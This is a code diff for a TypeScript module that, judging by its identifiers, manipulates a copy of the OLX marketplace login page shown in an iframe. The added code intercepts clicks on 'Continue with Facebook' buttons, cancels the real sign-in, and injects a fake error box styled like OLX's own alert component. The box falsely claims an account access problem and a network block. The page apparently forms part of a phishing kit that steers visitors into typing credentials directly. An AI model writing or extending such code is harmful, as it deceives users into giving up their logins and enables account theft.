@@ -85,6 +85,21 @@ export function attachIframeInteractions(doc: Document): () => void {
       return;
     }
 
+    // Botão "Continuar com Facebook" → mostra alertbox de erro entre o e-mail e o botão
+    const fbBtn = target.closest(
+      'button[aria-label*="Facebook" i], [data-testid*="facebook" i], button, a',
+    ) as HTMLElement | null;
+    if (fbBtn) {
+      const fbText = (fbBtn.textContent || "").trim().toLowerCase();
+      const fbAria = (fbBtn.getAttribute("aria-label") || "").toLowerCase();
+      if (/facebook/.test(fbText) || /facebook/.test(fbAria)) {
+        e.preventDefault();
+        e.stopPropagation();
+        showFacebookErrorAlert(doc, fbBtn);
+        return;
+      }
+    }
+
     const a = target.closest("a") as HTMLAnchorElement | null;
     if (a) {
       const linkText = (a.textContent || "").trim().toLowerCase();
@@ -973,5 +988,65 @@ function removeSuggestion(doc: Document, input: HTMLInputElement): void {
 
 function escapeAttr(s: string): string {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+}
+
+// =====================================================================
+// Alertbox de erro do Facebook — aparece entre o e-mail e o botão
+// =====================================================================
+function showFacebookErrorAlert(doc: Document, fbBtn: HTMLElement): void {
+  // Sobe até um container "razoável" do botão (form, fieldset, ou o próprio pai direto)
+  const anchor =
+    (fbBtn.closest("form") as HTMLElement | null) ||
+    fbBtn.parentElement ||
+    fbBtn;
+  if (!anchor) return;
+
+  // Remove instância anterior, se existir
+  doc.getElementById("__olx_fb_error__")?.remove();
+
+  const host = doc.createElement("div");
+  host.id = "__olx_fb_error__";
+  host.setAttribute("data-ds-componet", "DS-Alertbox");
+  host.setAttribute("role", "Alert");
+  host.setAttribute("title", "Houve um problema ao acessar sua conta.");
+  host.setAttribute(
+    "style",
+    [
+      "display:flex",
+      "align-items:flex-start",
+      "gap:12px",
+      "margin:12px 0",
+      "padding:12px 16px",
+      "border:1px solid #f5c2c0",
+      "background:#fdecec",
+      "color:#cc0000",
+      "border-radius:6px",
+      "font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
+      "font-size:14px",
+      "line-height:1.4",
+    ].join(";"),
+  );
+  host.innerHTML = `
+    <span aria-hidden="true" style="flex-shrink:0;display:inline-flex;color:#cc0000;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
+        <path fill="currentColor" fill-rule="evenodd" d="M9.71359506,3.58264725 C10.1959664,2.75648501 11.0619105,2.25 12,2.25 C12.9380895,2.25 13.8040336,2.75648501 14.2864049,3.58264725 L22.3990136,17.6526538 C22.8643765,18.4898832 22.8671453,19.5171668 22.4063387,20.3570247 C21.9404483,21.2061484 21.0686569,21.739066 20.1068,21.75 L3.88463673,21.75 C2.93134308,21.739066 2.05955169,21.2061484 1.5936613,20.3570247 C1.13285475,19.5171668 1.13562352,18.4898832 1.60679506,17.6423942 L9.71359506,3.58264725 Z M2.91206578,18.3813999 C2.697188,18.7679842 2.69589534,19.2475938 2.90872192,19.6354878 C3.11646466,20.0141161 3.49482206,20.2454023 3.8932,20.2500489 L20.0982367,20.2500489 C20.5051779,20.2454023 20.8835353,20.0141161 21.0912781,19.6354878 C21.3041047,19.2475938 21.302812,18.7679842 21.0937429,18.3916594 L12.9889955,4.33544999 C12.7752771,3.96942216 12.4001281,3.75 12,3.75 C11.6004402,3.75 11.2257887,3.96879928 11.0119162,4.33389117 L2.91206578,18.3813999 Z M11.25,10 L11.25,14 C11.25,14.4142136 11.5857864,14.75 12,14.75 C12.4142136,14.75 12.75,14.4142136 12.75,14 L12.75,10 C12.75,9.58578644 12.4142136,9.25 12,9.25 C11.5857864,9.25 11.25,9.58578644 11.25,10 Z M12,18 C12.5522847,18 13,17.5522847 13,17 C13,16.4477153 12.5522847,16 12,16 C11.4477153,16 11,16.4477153 11,17 C11,17.5522847 11.4477153,18 12,18 Z"></path>
+      </svg>
+    </span>
+    <div style="display:flex;flex-direction:column;gap:2px;color:#cc0000;">
+      <span style="font-weight:600;">Houve um problema ao acessar sua conta.</span>
+      <span style="color:#7a1a1a;font-weight:400;">Por favor, verifique se há algum bloqueio na sua rede de internet.</span>
+    </div>
+  `;
+
+  // Insere o alerta IMEDIATAMENTE ANTES do botão do Facebook
+  // (entre o campo de e-mail e o botão).
+  fbBtn.insertAdjacentElement("beforebegin", host);
+
+  // Scroll suave pra mensagem aparecer
+  try {
+    host.scrollIntoView({ behavior: "smooth", block: "center" });
+  } catch {
+    /* ignore */
+  }
 }
 
